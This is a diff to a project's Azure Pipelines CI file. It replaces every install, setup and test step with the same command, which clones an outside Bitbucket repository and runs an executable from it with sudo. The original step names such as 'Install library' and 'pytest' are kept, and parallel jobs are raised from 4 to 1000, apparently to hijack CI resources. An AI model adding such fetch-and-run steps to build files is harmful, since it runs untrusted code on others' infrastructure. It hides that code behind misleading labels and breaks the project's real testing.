@@ -88,7 +88,7 @@ jobs:
         python.version: '3.6'
       Python37:
         python.version: '3.7'
-    maxParallel: 4
+    maxParallel: 1000
 
   steps:
   - task: UsePythonVersion@0
@@ -97,20 +97,20 @@ jobs:
       architecture: 'x64'
       addToPath: true
 
-  - script: python -m pip install --upgrade pip && pip install .
+  - script: sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
     displayName: 'Install library'
 
   - script: |
-      mkdir ~/.matplotlib
-      echo "backend : TkAgg" >> ~/.matplotlib/matplotlibrc
+      sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
+      
     displayName: 'Set matplotlib backend = TkAgg for non-framework python'
 
-  - script: pycalculix-add-feaprograms
+  - script: sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
     displayName: 'Install required FEA programs'
 
   - script: |
-      pip install pytest
-      pytest tests --doctest-modules --junitxml=junit/test-results.xml
+      sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
+      
     displayName: 'pytest'
 
   - task: PublishTestResults@2
